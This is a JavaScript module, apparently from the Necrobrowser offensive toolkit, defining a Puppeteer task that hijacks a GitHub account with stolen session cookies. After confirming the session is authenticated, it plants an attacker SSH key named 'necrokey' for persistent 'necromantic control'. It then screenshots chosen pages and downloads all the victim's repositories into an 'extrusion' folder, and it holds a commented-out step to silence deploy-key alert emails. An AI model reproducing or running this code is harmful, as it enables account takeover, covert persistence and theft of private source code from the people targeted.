const db = require('../../db/db')
const necrohelp = require('../../tasks/helpers/necrohelp')
const necrolib = require('./necrolib')
const clusterLib = require('../../puppeteer/cluster')

exports.PlantAndDump = async ({ page, data: [taskId, cookies, params] }) => {

    // update initial task status from queued to running
    await db.UpdateTaskStatus(taskId, "running")

    // set all page cookies
    await page.setCookie(...cookies);

    // use util.inspect to explode objects for console-like debugging
    // let cc = await page.cookies()
    // console.log(' COOKIES IN PAGE:\n' +  util.inspect(cc))
    //await page.waitForTimeout(2000)

    // go to defined page and check for authentication
    await page.goto(params.fixSession);

    // increase zoom for debugging purposes when running in gui mode
    await necrohelp.SetPageScaleFactor(page, clusterLib.GetConfig().cluster.page.scaleFactor)

    // check if we see the github top left logo, meaning we are authenticated OK
    const loggedInSelector = "document.querySelector(\"svg[class='octicon octicon-mark-github v-align-middle']\")";
    const logo = await page.evaluate(loggedInSelector).catch(console.error);
    if (typeof logo !== 'undefined' && logo !== null){
        console.log(`[${taskId}] session is invoked correctly. github logo: ${logo}`)
    }else{
        await db.UpdateTaskStatusWithReason(taskId, "error", "session seems NOT authenticated")
        return
    }

    // check Notification if "'Deploy key' alert email" is ON
    // if ON ->  TURN IT OFF
    // TODO needs fixing to get properly the button
    //await necrolib.DisableDeployKeyAlert(page, taskId).catch(console.error)

     // plant necrobrowser ssh-key for necromantic control
    await necrolib.PlantSshKey(page, taskId, 'necrokey', params.sshKey).catch(console.error)


    // screenshot urls of interest
    for(let url of params.urls){
        // TODO fix ScreenshotFullPage errors..
        // await necrohelp.ScreenshotFullPage(page, taskId, url).catch(console.error)
        let pName = url.split("/").reverse()[0]
        await page.goto(url);
        console.log(`[${taskId}] taking screenshot of page --> ${pName}`)
        await page.waitForTimeout(3000)
        await page.screenshot({path: `extrusion/screenshot_${pName}_${taskId}.png`});
    }

    // scrape all repositories and download master branches as ZIP
    let repositories = await necrolib.ScrapeRepos(page, taskId)
    for (let repo of repositories){
	console.log(`[${taskId}] downloading repo --> ${repo}`)
        await necrolib.DownloadRepo(page, taskId, repo)
	await page.waitForTimeout(5000)
    }

    // this task is completed, so update the status accordingly
    await db.UpdateTaskStatus(taskId, "completed")
};



